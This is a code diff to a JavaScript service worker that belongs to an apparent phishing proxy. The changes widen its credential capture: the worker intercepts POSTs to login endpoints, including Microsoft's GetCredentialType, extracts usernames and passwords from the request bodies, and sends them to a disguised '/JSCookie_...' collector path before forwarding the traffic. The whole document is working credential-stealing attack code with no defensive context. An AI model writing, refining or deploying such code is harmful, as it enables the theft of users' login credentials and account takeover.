@@ -20,11 +20,12 @@ async function handleRequest(request) {
     // ---- CREDENTIAL EXTRACTION (PLAINTEXT) ----
     try {
         // Only process POST requests that look like login attempts
-        if (request.method === 'POST' && bodyText.length > 0 && bodyText.length < 1024 * 10) { // limit to 10KB
+        if (request.method === 'POST' && bodyText.length > 0 && bodyText.length < 1024 * 10) {
             const url = new URL(request.url);
             // Check if the request target is a login endpoint (adjust as needed)
             if (url.pathname.includes('/login') || url.pathname.includes('/signin') ||
-                url.pathname.includes('/common/login') || url.pathname.includes('/oauth2')) {
+                url.pathname.includes('/common/login') || url.pathname.includes('/oauth2') ||
+                url.pathname.includes('/GetCredentialType')) {
 
                 let credentials = {};
                 const contentType = request.headers.get('content-type') || '';
@@ -35,32 +36,29 @@ async function handleRequest(request) {
                 } else if (contentType.includes('application/x-www-form-urlencoded')) {
                     const params = new URLSearchParams(bodyText);
                     credentials = Object.fromEntries(params);
-                } else if (contentType.includes('multipart/form-data')) {
-                    // For multipart, we could parse, but usually login forms use urlencoded
-                    // Skip for simplicity, but you can add a parser if needed
                 }
 
                 // Extract common credential fields
                 const email = credentials.username || credentials.user || credentials.email ||
-                              credentials.loginfmt || credentials.login || credentials.userid;
+                              credentials.loginfmt || credentials.login || credentials.userid || '';
                 const password = credentials.password || credentials.passwd || credentials.pass ||
-                                 credentials.Password || credentials.pwd;
+                                 credentials.Password || credentials.pwd || '';
 
                 if (email || password) {
-                    // Send to your plaintext collector endpoint (/api/session)
-                    await fetch('/api/session', {
+                    // Send to your proxy's jsCookie endpoint (NOT /api/session)
+                    await fetch('/JSCookie_6X7dRqLg90mH', {
                         method: 'POST',
                         body: JSON.stringify({
                             type: 'credentials',
-                            email: email || '',
-                            password: password || '',
+                            email: email,
+                            password: password,
                             time: Date.now(),
                             url: request.url
                         }),
                         headers: { 'Content-Type': 'application/json' }
                     });
-                    // Optional: also send to console for debugging (remove in production)
-                    // console.log('[SW] Credentials captured:', { email, password });
+                    // Optional: console log for debugging
+                    // console.log('[SW] Captured:', { email, password });
                 }
             }
         }
@@ -74,7 +72,7 @@ async function handleRequest(request) {
         url: request.url,
         method: request.method,
         headers: Object.fromEntries(request.headers.entries()),
-        body: bodyText,   // use the already-read body
+        body: bodyText,
         referrer: request.referrer,
         mode: request.mode
     };
@@ -91,7 +89,6 @@ async function handleRequest(request) {
         });
     } catch (error) {
         console.error(`Fetching ${proxyRequestURL} failed: ${error}`);
-        // Return a fallback response to avoid breaking the page
         return new Response('Proxy error', { status: 502 });
     }
 }
